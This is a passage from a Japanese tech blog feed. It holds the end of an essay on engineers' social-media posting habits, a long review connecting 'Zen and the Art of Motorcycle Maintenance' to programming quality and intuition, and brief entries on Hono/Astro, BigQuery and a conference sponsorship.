に「共有しやすい」。SlackやXに投稿しやすい。みんなが「なるほど」と言える。でも、それを読んだ人が同じ問題を解決できるようになるか？答えはNOだ。SNSで断定的に語る「エンジニアの本質」も同じ構造だ。「エンジニアの根本の仕事は言語化です」。これを読んだ人は「なるほど、たしかに要件定義も設計も全部言語化だな」と納得する。スッキリする。腑に落ちる。でも実際の要件定義って何か。顧客の曖昧な要望を聞き取り、矛盾を見つけて指摘し、実現可能性を検討し、代替案を提示し、合意形成を図る。その過程での非言語的なコミュニケーション、表情の変化、声のトーン、沈黙の意味。これら全部を経験して初めて「要件定義」ができるようになる。でも「要件定義は言語化」という言葉には、その複雑さは一切含まれない。言語化によって、最も重要な「どうやってやるか」という情報が欠損している。私の構文もまさにこれをやっていた。「エンジニアの最大の課題は健康管理です」。この一文に圧縮するために、どれだけの情報を捨てたか。どんな健康問題が起きやすいのかなぜエンジニアは健康を害しやすいのか具体的にどんな対策が効果的なのか継続するための仕組みづくり挫折しやすいポイントと対処法これら全部を削ぎ落として、消化しやすい一文にする。読んだ人は「そうそう！」と共感する。でも健康管理ができるようになるわけじゃない。言語化は魔法じゃない。むしろ情報を捨てる技術だ。複雑な現実を、他人が飲み込める大きさに切り刻む作業。その過程で、最も価値のある部分——泥臭い試行錯誤の過程——が失われる。でも皮肉なことに、SNSやビジネス書の世界では、この「情報を捨てた後の残骸」こそが価値として流通している。なぜなら、それが一番「バズる」から。一番「売れる」から。さらに皮肉なのは、「ビジネス書100冊の教えをまとめた本」みたいなメタ自己啓発本まで出てきたこと。100冊分の知識を1冊で！という触れ込み。情報の欠損に次ぐ欠損。エッセンスのエッセンスのエッセンス。最後に残るのは、何の栄養もないサプリメントみたいな言葉の羅列。「ひとつのことをやり続けろ」と「ひとつのことをやり続けるな」。「ポジティブ思考が大事」と「ネガティブにフォーカスしろ」。どっちが正解なの？って思うけど、実はどっちでもいい。なぜなら、どちらも「なるほど」と思えるから。状況によって都合よく解釈できるから。そして結局、どちらも実践しないから。果ては、読まない自己啓発本を「なぜ、読めないのか？」と分析する本まで出てきた。買うだけで満足する自己啓発本について、なぜ読めないのかを解説する自己啓発本。これも買うだけで満足されるんだろうか。メタメタ自己啓発の無限ループ。SNSも同じ構造だ。言語化された「エンジニアの本質」を読んで「なるほど」と思う。でも実践はしない。だから同じような内容が手を変え品を変えて投稿されても、毎回新鮮に感じる。毎回「いいね」を押す。私もその供給側に回ってしまった。需要があるから供給する。言語化して、共感を集めて、バズらせる。市場原理としては正しい。でもエンジニアとして正しいかは別問題だ。さみしい夜にはペンを持て作者:古賀史健ポプラ社Amazonさみしい夜のページをめくれ (一般書)作者:古賀　史健ポプラ社Amazonタイパという幻想なぜ私たちは「レベル1」の罠から抜け出せないのか。それは現代の呪文「タイパ」にも原因がある。「すぐに結果がほしい！」——これこそが、搾取される側に回ってしまう人々の最大の特徴である。焦燥感に駆られた人間は、じっくりと腰を据えて物事に取り組むことができない。時間という最も貴重な投資資源を惜しみ、検証や比較検討のプロセスを省略してしまう。その結果、本来であれば選択すべき確実性の高い選択肢を見送り、「即効性」を謳う甘い罠に飛びついてしまうのだ。こうした人々が手にするのは、表面的には「成功」や「結果」に見える幻影だ。一時的な高揚感、束の間の満足感——しかし、それらは砂上の楼閣のように脆く、瞬く間に崩れ去る。そして失ったものを取り戻そうと、さらに性急な判断を重ね、同じ過ちを繰り返す。この悪循環は加速度的に進行する。資金、時間、精神的余裕、人間関係——あらゆるリソースが急速に枯渇していく。皮肉なことに、リソースが減れば減るほど、「今すぐ挽回したい」という焦りは強まり、ますます長期的な視点を持てなくなる。まさに負のスパイラルだ。対照的に、待つことができる人、忍耐強く種を蒔き育てることができる人は、決して搾取される側には立たない。彼らは複利の力を理解し、小さな積み重ねが大きな成果につながることを知っている。短期的な誘惑に惑わされず、本質的な価値を見極める眼を持っているのである。SNSの「レベル1」コンテンツは、まさにこの「タイパ」を求める心理に最適化されている。3秒で理解できて、5秒で共感できて、1秒で「いいね」が押せる。でも、3秒で理解できることに、本当の価値があるのか？エンジニアリングの本質は、時間をかけて複雑な問題と向き合うことだ。バグの原因を突き止めるのに何時間もかかることもある。新しい技術を習得するのに何週間もかかることもある。でもSNSは、その対極の価値観を植え付ける。「エンジニアの本質を1分で理解！」みたいな投稿が求められ、それを供給する側に私はいる。これがどれだけ矛盾してるか、分かってる。でもやめられない。タイパの経済学 (幻冬舎新書)作者:廣瀬涼幻冬舎Amazon感情キーワードバトルという地獄もっと深刻な問題がある。SNSが「議論」の形を完全に破壊したことだ。誰も元の投稿を読んでいない。自分が反応したいキーワードだけ拾って引用RTして、自分の言いたいことを言ってるだけ。元の文脈なんて無視。それを見た人がまた違う解釈で反応。伝言ゲームどころか、最初から誰も同じ話をしてない。「技術的負債」って言葉を使えば、ある人は「日本企業の問題」を語り始め、別の人は「負債じゃなくて投資と呼ぶべき」と言い出し、また別の人は「エンジニアの給料」の話にすり替える。全員が違う話をしているのに、全員が「議論に参加している」と思い込んでいる。一番ヤバいのは、この「感情キーワードバトル」に参加してる人たちが本当に議論してると思い込んでることだ。お互い別の話してるのに「論破した」「反論できないだろ」って勝利宣言。誰も誰の話も聞いてない。ただ自分の感情を違うキーワードで叫び続けてるだけ。これが「正しい議論の形」として定着していく。キーワードに脊髄反射、感情的に反論、さらに過激な言葉で応酬。このサイクルが「活発な議論」だと勘違いされる。本当に内容を理解して話そうとする人は「空気読めない」扱い。SNSが作り出した完成形がこれだ。構文の進化と劣化初期の構文はまだ救いがあった。「エンジニアの最大の課題は、実は健康管理です。長時間のコーディングや締め切りのストレスが、創造性と生産性を低下させることに気づきました」。少なくとも「気づき」があった。体験があった。今の構文は完全にテンプレート化している。「エンジニアの本質は〇〇です。なぜなら\xd7\xd7だからです。△△することが大切です」。中身がない。でもバズる。なぜなら、誰も中身を求めてないから。言語化して、整理して、共感を得る。でもそれだけ。実際の問題は何も解決しない。でも「理解した」気になるから、それで満足する。次の日には忘れて、また似たような構文に「いいね」を押す。手段として理解して使うここまで批判的に書いてきたが、実のところ、私は大人なので、SNSの活用については広報的な意味合い以上のものをあまり持ち合わせていない。フォロワー数は技術力じゃない。いいねの数はコードの質じゃない。影響力は問題解決能力じゃない。これらは全部、当たり前のことだ。SNSは私にとって広報ツールだ。会社の認知度を上げ、採用に貢献し、登壇機会を増やす。そういう実利的な面で活用している。9500人のフォロワーは、その成果の一つの指標に過ぎない。言語化が上手くなっても、コードが上手く書けるわけじゃない。構文を量産できても、サービスが作れるわけでも良いアーキテクチャができるわけじゃない。でも、それでいい。別のスキルだから。営業スキルと開発スキルが別物であるのと同じように。コードを書いている時、「これツイートにできるな」と思うことがある。でもそれは、仕事の経験を別の形でアウトプットする機会として捉えているだけだ。本業に支障はない。むしろ、言語化することで自分の理解が深まることもある()。大人としての割り切りこの記事を書きながら、「これもバズるだろうな」と計算している。それの何が悪いのか。自己批判もコンテンツの一つだ。メタ的な視点も価値提供の一形態だ。それでエンゲージメントが得られるなら、広報戦略として成功だ。でも同時に、私は誠実でありたいとも思っている。矛盾してる？そうかもしれない。私がやっていることは、ある側面から見れば明らかに「悪」だ。「レベル1」の罠を批判しながら、自分がその供給者になっている。若手エンジニアが本質的な学習から逃げる口実を提供している。「勉強した気」になる麻薬を売っている。この自覚がある。だからこそ、せめて誠実でありたい。自分が何をしているか、それがどんな影響を与えているか、目を逸らさずに直視する。綺麗事で飾らない。正当化もしない。SNSは仕事の一部。朝の投稿は、メールチェックと同じルーティン。フォロワーとのやり取りは、ネットワーキングの一環。感情的にならずに、淡々とこなす。でも、その行為が持つ毒性も理解している。syu-m-5151.hatenablog.comこの辺りの考え方は、上の記事でも書いた通り。SNSは道具であり、それ以上でもそれ以下でもない。でも道具は使い方次第で武器にも毒にもなる。結局のところ、絶対的な正義なんてない。技術的に正しいことだけが正義でもないし、ビジネス的な成功だけが正義でもない。SNSで影響力を持つことが善でも悪でもない。いや、違う。悪い面もある。確実にある。でも、それを自覚した上でやる。目を開いたまま、自分が加担している構造を理解しながら、それでも続ける。なぜなら、それが大人の仕事だから。大事なのは「したたかに、上手くやる」ということ。自分の技術的興味を追求しながら、会社にも価値を提供する。SNSで発信しながら、コードも書く。構文でバズらせながら、良い本を紹介する。悪であることを自覚しながら、それでも誠実に。全部やればいい。若手エンジニアがSNSの罠にハマるリスクは理解している。だから警告もする。自分が掘った落とし穴に「危険」の看板を立てるような偽善かもしれない。でも私自身は、もうその段階は過ぎた。道具は道具として使う。毒は毒として扱う。それだけの話だ。誠実であることと、悪を自覚することは矛盾しない。むしろ、悪を自覚しているからこそ、誠実でありたいと思う。少なくとも、自分が何をしているかについては嘘をつかない。それが私なりの最低限の誠実さだ。おわりに1年前の自戒「コード以外で目立つな」は、純粋だった。今なら違う。ソフトウェアエンジニアエンジニアもSNSも、どっちも仕事。SNSでバズることとエンジニアとしての価値は別物だ。言語化の上手さとコーディング能力も別物だ。当たり前だ。でも、両方できた方が良くないか？若手には今でも「SNS閉じてエディタ開け」と言う。まずちゃんとしたエンジニアリングを知ってほしいから。複雑な問題と格闘する充実感を味わってほしいから。でも経験を積んだら、両方開いておけばいい。私は今日も構文を作る。コードも書く。会社の広報もする。矛盾？知ったことか。SNSの罠にハマるな。でも罠を理解したら、利用しろ。技術を追求しろ。でも手段と目的を間違えるな。何より、上手くやれ。それだけだと思う。でも、自分がフォロワー数というココナッツの中の米を握った猿でないとは言えないので数年後のnwiizoを楽しみにしておいて下さい。","isoDate":"2025-09-03T08:48:30.000Z","dateMiliSeconds":1756889310000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"HonoとAstroは仲良し〜Cloudflare Workersでの使い方紹介","link":"https://speakerdeck.com/aminevg/honotoastrohazhong-liang-si-cloudflare-workersdenoshi-ifang-shao-jie","contentSnippet":"バックエンド向けウェブフレームワーク「Hono」、フロントエンド向けのウェブフレームワーク「Astro」。実は仲良いですよ！\\r今回はCloudflare Workers上での、HonoとAstroの使い方を紹介します。単独で使う、Hono-in-Astro、Astro-in-Honoなど組み合わせ方が多いです！最後にAstro-in-Hono関連のライブラリも紹介します。","isoDate":"2025-09-03T04:00:00.000Z","dateMiliSeconds":1756872000000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは?￼","link":"https://sreake.com/blog/bigquery-information-schema-jobs-query-dialect/","contentSnippet":"はじめに こんにちは。 夏が始まったと思ったらもう暦上では9月。夏の終わりです。時間の流れは早いですね。 こんな感じでいつの間にか秋が来て冬が来て年末になっていたり…不思議です。 今回ですが、BigQueryに「いつの間 […]The post BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは?￼ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-03T03:10:23.000Z","dateMiliSeconds":1756869023000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Amazon VPC CNIに学ぶCNI-LT版","link":"https://speakerdeck.com/bells17/amazon-vpc-cninixue-hucni-ltban","contentSnippet":"https://k8sjp.connpass.com/event/365262/","isoDate":"2025-09-02T04:00:00.000Z","dateMiliSeconds":1756785600000,"authorName":"bells17","authorId":"bells17"},{"title":"『禅とオートバイ修理技術』を読んだ。","link":"https://syu-m-5151.hatenablog.com/entry/2025/09/01/145700","contentSnippet":"はじめにプログラマーとして働き始めて数年が経った頃、私は壁にぶつかっていた。コードは書ける。バグも直せる。でも、何かが足りない。毎日キーボードを叩きながら、「これでいいのか」という疑問が頭をよぎる。そんな時期に、勉強会で出会った人が一冊の本を勧めてくれた。私は勧められた本を買うのが好きで、その場で積読として購入した。今となってはその人の顔も名前も思い出せないけれど、あの時の一言には本当に感謝しています。『禅とオートバイ修理技術』――タイトルを聞いた時は、正直なところピンと来なかった。禅？オートバイ？エンジニアである私とどう関係があるのか。禅とオートバイ修理技術 上 (ハヤカワ文庫NF)作者:ロバート Ｍ パーシグ早川書房Amazon禅とオートバイ修理技術 下 (ハヤカワ文庫NF)作者:ロバート Ｍ パーシグ早川書房Amazonでも読み始めてみると、これが不思議と心に響いた。技術と向き合うこと、品質を追求すること、理性と感性の葛藤。オートバイの修理を通じて語られる哲学は、まさに私がプログラミングで感じていた言語化できないモヤモヤそのものだった。以来、この本は私の座右の書となった。行き詰まるたびに読み返し、そのたびに新しい発見がある。最初は理解できなかった箇所が、経験を積むにつれて腑に落ちるようになる。まるで本自体が、読む人の成長に合わせて違う顔を見せてくれるかのようだ。実はこの文章も、5年前に書き始めて完成できずに下書きに眠っていたものだ。今回改めて書き直してみると、当時とはまったく違う視点でこの本を読んでいることに気づく。それだけ自分も変化したということなのだろう。特に若手のエンジニアには、ぜひ一度手に取ってもらいたい。技術書やビジネス書とは違う角度から、エンジニアリングの本質について考えさせてくれる。すぐには理解できなくても構わない。キャリアを重ねる中で、きっとこの本の言葉が響く瞬間が来るはずだ。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。古典的な思考とロマン的な思考本書の主人公は、物語の冒頭では古典的な（理性を重んじる）立場にいる。ロマン的な（情緒を重んじる）友人たちに対して、無理解で批判的な態度を取る。オートバイの構造を理解しようとしない友人を見下し、技術への無知を軽蔑する。メンテナンスを他人任せにする友人に苛立ち、「なぜ自分で理解しようとしないのか」と内心で批判する。読んでいて、胸が痛くなった。これは過去の私そのものだった。「なぜコードの仕組みを理解しようとしないんだ」と、フレームワークの内部実装に興味を示さない同僚を見下していた。「とりあえず動けばいい」という態度が理解できなかった。技術の背後にある原理を知ろうとしない人々を、内心で「浅い」と批判していた。私にとって、コードの構造を理解することこそが美しく、アルゴリズムの優雅さこそが感動的だった。でも、多くの人にとっては違う。彼らは技術を道具として使い、その先にある価値創造に集中していた。技術の詳細に囚われず、より大きな視点で物事を見ていた。古典的な視点からは、ロマン的な人々は「表面的」に見える。でもロマン的な視点からは、古典的な人々は「冷たく」「機械的」に見える。どちらも一面的な見方でしかない。以前、私は「正義のエンジニアという幻想」について考えたことがある。技術的に正しいことを追求し、それ以外を否定する。「媚びない」と言いながら、実際はただ無礼なだけ。技術的正しさを盾に、人間関係の機微を「非論理的」と切り捨てる。まさに、本書の主人公の初期の姿そのものだった。syu-m-5151.hatenablog.comしかし物語が進むにつれ、主人公の本当の目的が明らかになる。彼は実は中道を目指していた。古典的な立場とロマン的な立場を《クオリティ》という概念で統一しようとしていたのだ。分析と直感、構造と体験、理性と感性。対立ではなく、統合こそが答えだった。クオリティという統合点パーシグは「クオリティ」という概念を追求した。それは定義できない。定義した瞬間、別のものになってしまう。でも確実に存在する。誰もが「良いコード」と「悪いコード」の違いを感じることができる。しかし、その「良さ」を完全に言語化しようとすると、何か本質的なものが抜け落ちてしまう。改訂新版　良いコード／悪いコードで学ぶ設計入門 ―保守しやすい　成長し続けるコードの書き方作者:仙塲 大也技術評論社Amazon「可読性が高い」「保守しやすい」「パフォーマンスが良い」――これらは確かに重要な要素だが、それだけでは説明しきれない「何か」がある。syu-m-5151.hatenablog.comこの逆説的な性質は、グッドハートの法則やキャンベルの法則を思い起こさせる。「測定されるものは改善される。測定基準となったものは、良い測定基準ではなくなる」――クオリティを定量化しようとした瞬間、それは本来のクオリティから離れていく。コードカバレッジ100%を目指したら、意味のないテストが増えた。cyclomatic complexityを下げようとしたら、かえって読みにくいコードになった。メトリクスは重要だが、メトリクスがすべてではない。数値化された瞬間、クオリティは形骸化する。測りすぎ――なぜパフォーマンス評価は失敗するのか？作者:ジェリー・Z・ミュラーみすず書房Amazon優れたコードを見た瞬間の「これだ」という感覚。それは論理的分析より先に来る。でも、単なる感情でもない。理性と感性が融合した瞬間に現れる何か。センスの哲学 (文春e-book)作者:千葉 雅也文藝春秋Amazonある日、オープンソースのコードを読んでいて息を呑んだことがある。複雑な問題を、驚くほどシンプルに解決していた。無駄が一切なく、それでいて拡張性も担保されている。「美しい」としか言いようがなかった。後から分析すれば、SOLID原則に従っているとか、デザインパターンが適切に使われているとか説明できる。でも、最初に感じたのは、理屈を超えた「美」だった。古代ギリシアでは、これを「アレテー」と呼んだ。「それそのものが持つポテンシャルを最大限発揮している状態」。馬には馬のアレテーがあり、ナイフにはナイフのアレテーがある。コードで言えば、その、コードやシステムが解決すべき問題に対して、最も自然で、最も美しく、最も効果的な形で存在している状態。過不足がない。シンプルだが単純ではない。複雑な問題を複雑に解くのではなく、本質を見抜いて エレガント に解く。それがコードのアレテー、つまりクオリティだ。理性だけでは到達できない。感性だけでも到達できない。両方が必要だ。論理的な正しさと、直感的な美しさ。分析と統合。部分と全体。これらが調和した時、初めてクオリティが現れる。A Philosophy of Software Design, 2nd Edition (English Edition)作者:Ousterhout, John K. ISSVWOAmazon物語の転換物語の終盤、主人公は古典的な立場への疑問を深めていく。科学的方法は使い続けるが、科学万能主義には批判的になる。むしろロマン的な立場に理解を示し始める。きっかけは、科学的方法の限界に直面したことだった。オートバイの不調の原因を論理的に分析し、仮説を立て、一つずつ検証していく。しかし、問題は解決しない。考えられる原因をすべて潰しても、バイクは不調のまま。そして気づく――仮説は無限に作れることに。「一定の現象を説明しうる合理的な仮説の数は無限にある」この気づきが、主人公を変えた。科学は仮説を検証する方法は教えてくれるが、どの仮説を選ぶべきかは教えてくれない。無限の可能性の中から、どうやって「これだ」という一つを選ぶのか。絶対的な真理など存在しない。だとしたら、何を基準に選択すればいいのか？答えは「クオリティ」だった。論理的な正しさだけでなく、その状況における「良さ」を感じ取る能力。理性と感性を統合した判断。優れた整備士は、エンジン音を聞いただけで不調の原因を言い当てる。それは論理的推論の結果ではない。経験と直感が導く「これしかない」という確信。主人公は理解する。友人たちがオートバイの仕組みを知ろうとしないのは、怠惰ではなく、別の関わり方を選んでいるからだ。彼らにとってバイクは、風を感じ、自由を味わう道具。内部構造など知らなくても、その本質的な価値は変わらない。古典的でもロマン的でもなく、その両方を包含する視点。それこそが、パーシグが追い求めていたものだった。無限の仮説とプログラミングプログラミングでも同じことが起きる。一つの問題を解決する方法は無数にある。私も経験がある。新規プロジェクトのアーキテクチャを決める時、本を読めば読むほど迷走した。『クリーンアーキテクチャ』は「ビジネスロジックを中心に」と説く。『マイクロサービスパターン』は「サービスの分割を」と勧める。『レガシーコード改善ガイド』は「まずテストから」と主張する。どれも正しい。でも、どれも部分的だ。ある時、気づいた。これらの本は地図のようなものだ。山頂への道は無数にあり、どの道も「正しい」。でも、今の自分たちのチームが、この天候で、この装備で登るべき道は一つ。その判断は、地図だけでは下せない。だから必要なのは、理論を超えた何か。コンテキストを読み取り、チームの状況を感じ取り、ユーザーの気持ちを想像する。スタートアップなら速度を、エンタープライズなら堅牢性を、でもそれも一概には言えない。チームの経験、プロダクトの成熟度、市場の要求、技術的負債の現状――すべてを総合的に「感じ取って」判断する。論理と感性を統合した判断。それは経験を積むことでしか身につかない。でも、それこそがシニアエンジニアの真の価値なのかもしれない。無限の選択肢の中から、「今、ここで、このチームが選ぶべき道」を見出す能力。それもまた、クオリティの一つの形だ。アーキテクトの教科書 価値を生むソフトウェアのアーキテクチャ構築作者:米久保 剛翔泳社Amazon主客の融合オートバイのメンテナンス中、固着したネジと格闘する場面がある。パーシグはこう語る。「修理工とオートバイは永遠に別個の存在ではない。二元的な考え方をすることで、修理工とオートバイとの間に存在する分離できない関係、つまり仕事に専心する職人気質といったものが失われてしまう」プログラミングも同じだ。私たちはコードを「書く」のではない。システムと対話し、問題空間と解決空間を行き来しながら、共に答えを見つけていく。フロー状態に入った時、キーボードは手の延長になり、思考は直接コードになる。変数名を考える必要もない。自然と適切な名前が浮かぶ。この時、プログラマーとコードの境界は消える。理性も感性も超えた、純粋な創造の瞬間。最近流行りのAIによるコード生成では、この感覚は得られない。プロンプトを書いて、生成されたコードをレビューして、修正を指示する。それは便利だし、効率的かもしれない。でも、そこには主客の分離がある。私とコード、指示する者と実行する者という二元的な関係。AIがどれだけ進化しても、この融合の瞬間は体験できないのかもしれない。それは効率や正確さとは別の次元の話だから。パーシグが固着したネジと格闘しながら得た洞察、その瞬間の一体感。それは自分の手でコードを書き、自分の頭で考え、自分の感覚で判断することでしか得られない。少なくとも今のところはその兆しすら感じない。熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon心の静寂「バイクの修理に取り組むときに心がけるべきことは、自他の分離をしないような心の落ち着きを養うことである。心の落ち着きは正しい価値を生み、正しい価値は正しい思念を生む」デバッグで行き詰まった時、論理的分析だけでは見えないものがある。深呼吸して、システムの「気配」を感じる。ログを機械的に読むのではなく、パターンを「感じ取る」。正常時と異常時の「違和感」を察知する。これは非科学的なことではない。むしろ、科学と直感を統合した、より高次の認識方法だ。将棋の棋士が盤面を「読む」ように、経験豊富なエンジニアはシステムを「読む」。それは論理的分析と直感的理解が融合した、独特の認識方法だ。心が乱れていると、コードも乱れる。焦って書いたコードは、必ずどこかに歪みがある。逆に、落ち着いた心で書いたコードは、自然で無理がない。心の状態は、そのままコードの質に反映される。奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazonガンプション・トラップパーシグが作った「ガンプション・トラップ」という概念は、創造的な活動における意欲や熱意（ガンプション）を奪う罠のことだ。理性の側には、完璧な設計への固執という罠がある。「もっとエレガントな解法があるはずだ」という思いに囚われて、永遠にリファクタリングを続ける。より良い抽象化を求めるあまり、実装が進まない。分析に分析を重ね、結局は麻痺状態に陥る。一方、感性の側にも危険が潜んでいる。「なんとなくXXが好き」「とにかくYYに慣れている」という理由だけで技術選定をする。最初の直感に囚われて、他の可能性を検討しない。「このコードは美しい」という感覚に酔いしれて、実用性を忘れる。特に「価値観の硬直」の話が印象的だった。南インドの猿の罠――ココナッツの中の米を握った猿は、手を離せば自由になれるのに、米を手放せない。私たちも同じだ。「これがベストプラクティスだから」と言いながら、実は状況が変わっていることに気づかない。逆に、「自分のやり方」に固執して、明らかに優れた新しい手法を拒絶する。罠は至るところにある。それを避けるには、自分が今どの罠に陥りかけているかを認識し、一歩引いて見る必要がある。情報を正しく選択するための認知バイアス事典 行動経済学・統計学・情報学 編作者:情報文化研究所フォレスト出版Amazonテクノロジーとの関係性「真の醜さの原因は、テクノロジーを生み出す人々と、彼らが生み出す物との関係のなかに横たわっている」パーシグはこの言葉で、技術そのものが問題なのではなく、私たちと技術の関係が問題だと指摘する。オートバイを恐れる友人も、オートバイに依存する主人公も、どちらも不健全な関係だった。技術を理性的に分析するだけでも、感情的に拒絶するだけでもダメだ。技術と「共に在る」ことが大切。対話し、感じ取り、理解し、共に成長する。新しいフレームワークを学ぶ時、ドキュメントを読むだけでは不十分。実際に触って、感触を確かめ、「このフレームワークが望んでいること」を感じ取る。作者の思想、コミュニティの文化、設計の美学。技術の向こう側にある「人間」を理解する。技術は道具以上の存在になりうる。それは私たちの思考を拡張し、新しい可能性を開く。でも同時に、技術に振り回されることもある。流行に飛びつき、本質を見失い、手段が目的化する。パーシグが言うように、技術との健全な関係を築くには、クオリティを中心に据える必要がある。行き詰まりの価値プログラミングには様々な行き詰まりがある。どんな設計にすべきか何日も悩む。アーキテクチャの方向性で迷い続ける。技術選定で延々と議論する。実装方法が思いつかない。エラーの原因が分からない。これらはすべて、私たちが日常的に経験する行き詰まりだ。パーシグも、オートバイの不調だけでなく、人生の様々な場面で行き詰まりと向き合った。大学での哲学的探求、クオリティの定義、東洋と西洋の思想の統合。どれも簡単には答えが出ない問題だった。しかし、その行き詰まりこそが、彼を深い洞察へと導いた。行き詰まりは、今使っている思考法の限界を示すサインだ。論理だけで解決しようとしているなら、直感を使ってみる。感覚だけで進めているなら、分析的に考えてみる。視点を変え、アプローチを変え、時には問題そのものを問い直す必要がある。最高のブレイクスルーは、理性と感性が統合された瞬間に起きる。散歩中に突然解決策が浮かぶのは、論理的思考が一旦止まり、無意識の直感が働くからだ。しかし、その直感は、それまでの論理的分析があってこそ生まれる。苦闘は無駄ではない。それは答えを「熟成」させる時間なのだ。最近では、生成AIに問題を投げれば、すぐに答えが返ってくる。確かに便利だ。でも、そこには何かが欠けている。パーシグがオートバイと格闘しながら得た洞察、その苦闘の中で培われた理解の深さ。それは、答えを与えられることでは決して得られない。自分で考え、悩み、試行錯誤することで初めて、問題の本質が見えてくる。技術への理解が深まり、思考が鍛えられ、判断力が養われる。だから行き詰まりを恐れる必要はない。それは成長の前兆であり、ブレイクスルーの準備期間だ。大切なのは、行き詰まりと向き合う姿勢。焦らず、諦めず、クオリティを追求し続けること。その先に必ず何かが見えてくる。中道への道物語を通じて、主人公は変化していく。最初は理性の側に偏り、ロマン的なものを軽視していた。しかし、理性の限界を知り、感性の価値を認識し、最終的には両者を統合する道を見出す。この変化は緩やかで、時に後退しながら進む。主人公は何度も自分の過去（パイドロス）と向き合い、その度に少しずつ理解を深めていく。完全な統合ではなく、絶え間ない調整のプロセスとして。私も似た道を歩んでいる。最初は、論理と理性こそがすべてだと思っていた。設計パターンを暗記し、アルゴリズムを学び、ベストプラクティスを追求した。コードレビューでは「なぜこう書いたのか」を論理的に説明できることが最重要だと信じていた。感覚的な判断は「プロらしくない」と切り捨てていた。転機は、あるシニアエンジニアとのペアプログラミングだった。彼は設計を決める時、まず黙って考え、そして「これが気持ちいい」と言った。最初は戸惑った。でも、その設計は確かに優れていた。後から理由を分析すると論理的にも正しかったが、彼は直感が先行していた。今では分かる。優れたコードには、論理を超えた「何か」がある。それは説明できないけれど、確実に感じることができる。コードを読んだ瞬間の「あ、これは違う」という違和感。リファクタリング後の「これだ」という確信。これらは理性的分析の前に訪れる。でも、だからといって直感だけに頼るわけではない。感じた「何か」を論理的に検証し、言語化する努力も続ける。理性と感性は対立するものではなく、互いを補完し合うパートナーなのだ。中道とは、真ん中に立ち止まることではない。両極を知り、状況に応じて自在に行き来すること。時には徹底的に論理的に、時には大胆に直感的に。そして多くの場合は、その両方を同時に働かせながら。この「何か」を追求することこそが、本当のプログラミングなのかもしれない。技術は手段であり、目的は「良いもの」を作ること。その「良さ」は、理性と感性が調和した時に初めて生まれる。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazonおわりにパーシグは「クオリティ」を追求するあまり精神を病み、最終的には息子との旅を通じて、理性と感性を統合する道を見つけた。この本を読んで10年以上経つが、私のエンジニアリングへの向き合い方は確実に変わった。昔は「正しいコード」を書くことばかり考えていた。設計パターンに当てはめ、メトリクスを改善し、ベストプラクティスを守る。それが良いエンジニアだと思っていた。でも今は違う。チームの状況、プロダクトの段階、ユーザーのニーズ――すべてを考慮して「今ここで最適な選択」をすることが大切だと理解している。コードレビューの姿勢も変わった。以前は「なぜこう書いたのか」を論理的に説明することを求めていた。今は「これで良さそう」という直感的な判断も大切にしている。もちろん、その直感を後から論理的に検証することは忘れないが。『禅とオートバイ修理技術』は、エンジニアリングの教科書ではない。でも、技術と向き合う姿勢について、どんな技術書よりも深い示唆を与えてくれる。良いコードを書くには、論理的思考も直感も必要だ。設計の美しさを感じ取る感性と、それを実装する技術力。問題の本質を見抜く洞察力と、地道にデバッグする忍耐力。これらはどれも欠かせない。技術は進化し続ける。新しいフレームワーク、新しいパラダイム、新しいツール、AIなども忘れてはいけない。でも、「良いものを作りたい」という気持ちと、そのための試行錯誤は変わらない。もし若手エンジニアがこれを読んでいるなら、ぜひ『禅とオートバイ修理技術』を手に取ってみてほしい。すぐには理解できないかもしれない。でも、エンジニアとして経験を積むうちに、きっとこの本の言葉が響く瞬間が来る。その時、あなたのエンジニアリングは一段階上のレベルに達しているはずだ。ただ、残念なことに、この本は現在電子書籍でしか読めない。紙の本がないんです(プレ値がついてます)。Kindleで読むのも悪くないけれど、こういう何度も読み返したくなる本は、やっぱり紙で持っていたい。ページに付箋を貼ったり、大事な箇所に線を引いたり、表紙が擦り切れるまで読み込みたい。そういう本なんです、これは。早川書房の担当者さん、もしこれを読んでいたら、ぜひ紙の本での復刊を検討していただけないでしょうか。ハードカバーでも文庫でも、とにかく紙で読めるようにしてほしい。きっと多くのエンジニアが、デスクの横に置いて、迷った時に手に取る一冊になるはずです。","isoDate":"2025-09-01T05:57:00.000Z","dateMiliSeconds":1756706220000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、「Developers Summit 2025 KANSAI」に協賛・出展","link":"https://sreake.com/blog/developers-summit-2025-kansai/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 9月17日（水）に開催される「Developers Summit 2025 KANSAI」に展示ブーススポンサーとして協賛します。The post スリーシェイク、「Developers Summit 2025 KANSAI」に協賛・出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-01T01:30:00.000Z","dateMiliSeconds":1756690200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQueryのMERGEステートメントについて","link":"https://zenn.dev/nedoko_dok0dko/articles/52a6a8e2412dcb","contentSnippet":"whatBigQueryのマージステートメントについて調べたことや知ったことを個人的にまとめたもの MERGEステートメントとはhttps://cloud.google.com/bigquery/docs/reference/standard-sql/dml-syntax#merge_statementhttps://cloud.google.com/blog/ja/products/data-analytics/bigquery-explained-data-manipulation-dml別のテーブルと一致する値に基づいて以下のステートメントをまとめて実行できる機...","isoDate":"2025-08-26T10:29:31.000Z","dateMiliSeconds":1756204171000,"authorName":"seno","authorId":"seno"},{"title":"ミニマムかつ未来を見据えたGoogle Cloudアーキテクチャ","link":"https://zenn.dev/kamos/articles/poc_google_cloud","contentSnippet":"!この記事は人間が書き、AIにレビューしてもらいました 